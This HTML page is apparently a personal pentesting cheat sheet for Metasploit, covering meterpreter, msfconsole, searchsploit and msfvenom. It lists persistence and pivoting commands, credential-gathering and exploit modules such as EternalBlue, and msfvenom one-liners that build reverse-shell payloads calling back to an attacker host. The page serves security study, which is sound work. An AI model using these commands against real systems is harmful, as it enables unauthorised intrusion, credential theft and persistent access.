<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8"/>
        <link rel="stylesheet" href="../../styles/styles.css"/>
        <link rel="script" href="./scripts/cachebuster1.4.js"/>
        <title>Metasploit Framework</title>
    </head>
    <body>
        <button class="home-button" onclick="window.location.href='../../index.html'">Home</button>
        <div class="border-div">
            <div>
                <h1 style="display: inline-block;">Metasploit Framework</h1>
                <img style="float: right;" src="../../images/metasploit.png" width="200px">
            </div>
            <p>Metasploit is a open source platform for developing and implementing automated attacks and defense.</p>
            <p><a href="https://www.metasploit.com/">Download</a></p>
            <p>Or install with <span><span class="code">apt install metasploit-framework</span></p>
            <pre id="meterpreter" ></pre>
            <div class="section-wrapper">
                <h2>Meterpreter</h2>
                <p>Meterpreter is a translation layer built into the Metasploit Framework console. It allows you to interact from your OS's shell with another OS's shell while being able to translate appropriately</p>
                <p>Some handy commands:</p>
                <p><span class="code">import module</span> - allows meterpreter to import a module, like powershell</p>
                <p><span class="code">load sourcefile destinationfile</span> - allows meterpreter to load a file onto the target machine from the local machine</p>
                <p><span style="background: yellow;">(PERSISTENCE)</span> <span class="code">run getgui -e -u username -p password</span> - Meterpreter script to enable RDP and create a user with a password</p>
                <p><span style="background: yellow;">(PIVOTING)</span> <span class="code">run autoroute -s 192.168.0.0/24</span> - Meterpreter script to add a route from attacker to target IP/subnet. Use <span class="code">run autoroute -p</span> to view autoroutes</p>
                <p>IN MSFCONSOLE: <span class="code">sessions -u sessionid</span> - upgrades a session to a meterpreter shell (This will always use the same port, so if you need to upgrade multiple sessions, consider using <span class="code">multi/manage/shell_to_meterpreter"></span></p>
            </div>
            <pre id="msfconsole"></pre>
            <div class="section-wrapper">
                <h2>Msfconsole</h2>
                <p>Msfconsole is a CLI tool that can be used to interact with Metasploit</p>
                <p>Usage:</p>
                <ol>
                    <li style="margin-bottom: 10px;"><span class="code">msfconsole</span> - starts the console</li>
                    <li style="margin-bottom: 10px;"><span class="code">search term to search</span> - searches database for exploits/payloads
                        <ul style="list-style-type: '- ';">
                            <li>You can even use terms in your search. Such as <span class="code">type:exploit</span> to search specifically for exploits</li>
                        </ul>
                    </li>
                    <li style="margin-bottom: 10px;"><span class="code">use #</span> - selects exploit based on corresponding number</li>
                    <li style="margin-bottom: 10px;"><span class="code">show payloads</span> - lists available payloads for selected exploit</li>
                    <li style="margin-bottom: 10px;"><span class="code">use #</span> - selects payload</li>
                    <li style="margin-bottom: 10px;"><span class="code">show options</span> - lists available options for exploit and payload</li>
                    <li style="margin-bottom: 10px;"><span class="code">set OPTION value</span> - sets an option</li>
                    <li><span class="code">exploit</span> or <span class="code">run</span> - runs the selected exploit</li>
                </ol>
                <p>Some important things to note:</p>
                <ul style="list-style-type: '- ';">
                    <li style="margin-bottom: 10px;">Creating a workspace can be helpful to organize your work, to create a new workspace, type <span class="code">workspace -a workspacename</span> and to interact with a workspace type <span class="code">workspace workspacename</span></li>
                    <li style="margin-bottom: 10px;">Sessions are often created when a shell is opened from an exploit, type <span class="code">sessions</span> to list all sessions, and <span class="code">sessions -i sessionid</span> to interact with a session. You can upgrade a session to a meterpreter shell with <span class="code">sessions -u sessionid</span></li>
                    <li style="margin-bottom: 10px;">Your payload is typically OS-dependant, meaning that a 64-bit Windows payload must be used for a 64-bit Windows target, and so on. Similarly, your multi/handler payload will (usually) have to match your generated payload</li>
                    <li style="margin-bottom: 10px;">A stageless payload is usually much larger than a staged payload, exploits may have a limit to the size of a payload</li>
                    <li style="margin-bottom: 10px;">Sometimes jobs can get stuck and cause conflictions with ports or re-running commands. Type <span class="code">jobs</span> to list all jobs and <span class="code">jobs -k jobid</span> to kill a job</li>
                    <div style="background: yellow; border-radius: 10px; margin-right: 20px;">
                    <li style="margin-bottom: 10px;">db_nmap - NMAP with database saving
                        <ol>
                            <li>Ensure that the postgresql database is running (<span class="code">systemctl start postgresql</span>)</li>
                            <li>Ensure that the metasploit database is running (<span class="code">msfdb init</span>)</li>
                            <li>Set up a workspace to save and organize your data (<span class="code">workspace -a workspacename</span>)</li>
                            <li>Use <span class="code">db_nmap OTHER_NORMAL_NMAP_OPTIONS</span> to run NMAP</li>
                            <li>After you have used a db_nmap command, you can view information about your scan(s) with several commands
                                <ul>
                                    <li>hosts - list all hosts in the database</li>
                                    <li>services - list all services in the database</li>
                                </ul>
                            </li>
                        </ol>
                    </li>
                    </div>
                </ul>
                <p>Some useful payloads/exploits:</p>
                <ul style="list-style-type: '';">
                    <li style="list-style-type: 'Exp. - '; margin-bottom: 10px; margin-left: 10px;"><a href="https://www.rapid7.com/db/modules/exploit/windows/local/bypassuac_injection/">UAC bypass</a></li>
                    <li style="list-style-type: 'Exp. - '; margin-bottom: 10px; margin-left: 10px;"><a href="https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/">Eternal Blue</a></li>
                    <li style="list-style-type: 'Exp. - '; margin-bottom: 10px; margin-left: 10px;">linux/samba/is_known_pipename - SAMBA login</li>
                    <li style="list-style-type: 'Exp. - '; margin-bottom: 10px; margin-left: 10px;">post/multi/gather/ssh_creds - Gather SSH credentials</li>
                    <li style="list-style-type: 'Exp. - '; margin-bottom: 10px; margin-left: 10px;">post/linux/gather/hashdump - Linux unshadow hashdump</li>
                    <li style="list-style-type: 'Exp. - '; margin-bottom: 10px; margin-left: 10px;"><span style="background: yellow;">(PERSISTENCE)</span> exploit/windows/local/persistence_service - Windows service persistence</li>
                    <li style="list-style-type: 'Exp. - '; margin-bottom: 10px; margin-left: 10px;">exploit/windows/smb/psexec - Windows SMB psexec</li>
                    <li style="list-style-type: 'Payl. - '; margin-bottom: 10px; margin-left: 10px;"> /windows/x64/meterpreter_reverse_tcp - 64-bit reverse TCP shell</li>
                </ul>
            </div>
            <pre id="searchsploit"></pre> 
            <div class="section-wrapper">
                <h2>Searchsploit</h2>
                <p>Searchsploit is a CLI tool that can be used to search for exploits</p>
                <p>Usage:</p>
                <p><span class="code">searchsploit term</span> - searches database for exploits</p>
                <p>You can also download a script that searchsploit recommends based on your search term by typing <span class="code">searchsploit -m 123456</span> (replace 123456 with the ID listed in the "Path" section)</p>
            </div>
            <pre id="msfvenom"></pre>
            <div class="section-wrapper">
                <h2>Msfvenom</h2>
                <p>Msfvenom is a CLI tool that can be used to create executable payloads</p>
                <p>Usage:</p>
                <span class="code">msfvenom -p cmd/unix/reverse_netcat LHOST=LOCALMACHINE LPORT=4444 -f filetype R > output</span>
                <p>Example:</p>
                <div class="section-wrapper" style="padding-top:10px; background: none; box-shadow: none;">
                    <span class="code">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=1234 -f asp R > output.asp</span>
                    <p class="ind">After uploading this to the target, you would typically use <span class="code" style="margin-bottom: 2px;">multi/handler</span> in msfconsole as your exploit and <span class="code">windows/meterpreter/reverse_tcp</span></span> as your payload, ensuring that your options in metasploit are set to the same LHOST and LPORT as your payload that you generated</p>
                </div>
                <p class="ind">-p: specifies payload</p>
                <p class="ind">-lhost: specifies listening host</p>
                <p class="ind">-lport: specifies listening port</p>
                <p class="ind">-R: specifies raw format</p>
            </div>
        </div>
    </body>
</html>
